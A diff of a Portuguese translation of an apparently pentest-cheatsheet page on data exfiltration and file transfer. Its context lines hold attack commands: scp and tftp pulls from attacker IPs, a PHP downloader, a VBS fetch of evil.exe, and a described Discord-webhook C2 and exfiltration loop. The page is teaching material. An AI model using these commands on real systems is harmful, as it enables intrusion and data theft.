@@ -2,11 +2,18 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
+> [!TIP]
+> Para um exemplo ponta a ponta de staging loot em `C:\Users\Public` e exfiltrating com Rclone para imitar backups legítimos, reveja o fluxo de trabalho abaixo.
+
+{{#ref}}
+../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
+{{#endref}}
+
 ## Domínios comumente whitelisted para exfiltrate informações
 
 Consulte [https://lots-project.com/](https://lots-project.com/) para encontrar domínios comumente whitelisted que podem ser abusados
 
-## Copy\&Paste Base64
+## Copiar\&Colar Base64
 
 **Linux**
 ```bash
@@ -42,7 +49,7 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Enviar arquivos
+### Upload de arquivos
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 - [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
@@ -100,14 +107,14 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
-## Webhooks (Discord/Slack/Teams) para C2 & Data Exfiltration
+## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
 
-Webhooks são endpoints HTTPS somente-gravação que aceitam JSON e partes de arquivo opcionais. Eles são comumente permitidos para domínios SaaS confiáveis e não exigem chaves OAuth/API, tornando-os úteis para beaconing de baixa fricção e exfiltration.
+Webhooks são endpoints HTTPS de somente escrita que aceitam JSON e partes de arquivo opcionais. Eles costumam ser permitidos para domínios SaaS confiáveis e não exigem OAuth/API keys, tornando-os úteis para beaconing de baixa fricção e exfiltration.
 
 Key ideas:
-- Endpoint: o Discord usa https://discord.com/api/webhooks/<id>/<token>
-- POST multipart/form-data com uma parte chamada payload_json contendo {"content":"..."} e parte(s) de arquivo opcionais chamadas file.
-- Padrão de loop do operador: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confirmam a entrega.
+- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data with a part named payload_json containing {"content":"..."} and optional file part(s) named file.
+- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confirm delivery.
 
 PowerShell PoC (Discord):
 ```powershell
@@ -178,8 +185,8 @@ Start-Sleep -Seconds 20
 }
 ```
 Notas:
-- Padrões semelhantes se aplicam a outras plataformas de colaboração (Slack/Teams) que usam seus incoming webhooks; ajuste a URL e o esquema JSON conforme necessário.
-- Para DFIR de artefatos de cache do Discord Desktop e recuperação de webhook/API, consulte:
+- Padrões semelhantes se aplicam a outras plataformas de colaboração (Slack/Teams) que usem seus incoming webhooks; ajuste a URL e o JSON schema conforme necessário.
+- Para DFIR de artefatos de cache do Discord Desktop e recuperação de webhook/API, veja:
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -192,7 +199,7 @@ Notas:
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP server (NodeJS)
+### Servidor FTP (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
@@ -260,13 +267,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-O atacante precisa que o SSHd esteja em execução.
+O atacante precisa ter o SSHd em execução.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Se a vítima tiver SSH, o atacante pode montar um diretório da vítima na máquina do atacante.
+Se o sistema da victim tiver SSH, o attacker pode montar um diretório da victim no attacker.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -313,13 +320,13 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Se você pode enviar dados para um servidor SMTP, você pode criar um servidor SMTP para receber os dados com python:
+Se você puder enviar dados para um servidor SMTP, pode criar um servidor SMTP para receber os dados com python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Por padrão no XP e 2003 (em outros é necessário adicioná-lo explicitamente durante a instalação)
+Por padrão no XP e 2003 (em outros precisa ser adicionado explicitamente durante a instalação)
 
 No Kali, **start TFTP server**:
 ```bash
@@ -339,7 +346,7 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Baixe um arquivo com um oneliner em PHP:
+Baixe um arquivo com um PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -381,13 +388,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-O programa `debug.exe` não apenas permite a inspeção de binários, mas também possui a **capacidade de reconstruí-los a partir de hex**. Isso significa que, fornecendo um hex de um binário, `debug.exe` pode gerar o arquivo binário. No entanto, é importante notar que debug.exe tem uma **limitação para montar arquivos de até 64 kb de tamanho**.
+O programa `debug.exe` não apenas permite a inspeção de binários, mas também tem a **capacidade de reconstruí-los a partir de hex**. Isso significa que, fornecendo um hex de um binário, `debug.exe` pode gerar o arquivo binário. No entanto, é importante notar que debug.exe tem uma **limitação de montar arquivos de até 64 kb de tamanho**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Em seguida, cole o texto no shell do Windows e um arquivo chamado nc.exe será criado.
+Depois cole o texto no windows-shell e um arquivo chamado nc.exe será criado.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
